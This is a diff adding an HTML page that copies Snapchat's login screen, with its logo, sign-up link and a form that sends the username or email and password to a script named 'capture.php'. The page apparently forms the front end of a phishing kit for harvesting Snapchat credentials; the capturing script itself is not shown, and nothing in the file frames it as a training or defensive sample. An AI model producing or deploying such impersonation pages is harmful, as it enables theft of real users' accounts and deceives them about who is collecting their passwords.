@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="./styles.css">
+  <title>Snapchat Login</title>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-header">
+      <img src="snapchat-logo.png" alt="Snapchat Logo" class="logo">
+      <h1>Log In</h1>
+    </div>
+    <form action="./capture.php" method="POST">
+      <label for="email">Username or Email</label>
+      <input type="text" id="email" name="email" required>
+      
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+      
+      <div class="forgot-password">
+        <a href="#">Forgot Password</a>
+      </div>
+      
+      <button type="submit" class="login-button">Log In</button>
+    </form>
+    <div class="signup-footer">
+      <p>New To Snapchat? <a href="#">Sign Up</a></p>
+    </div>
+  </div>
+</body>
+</html>
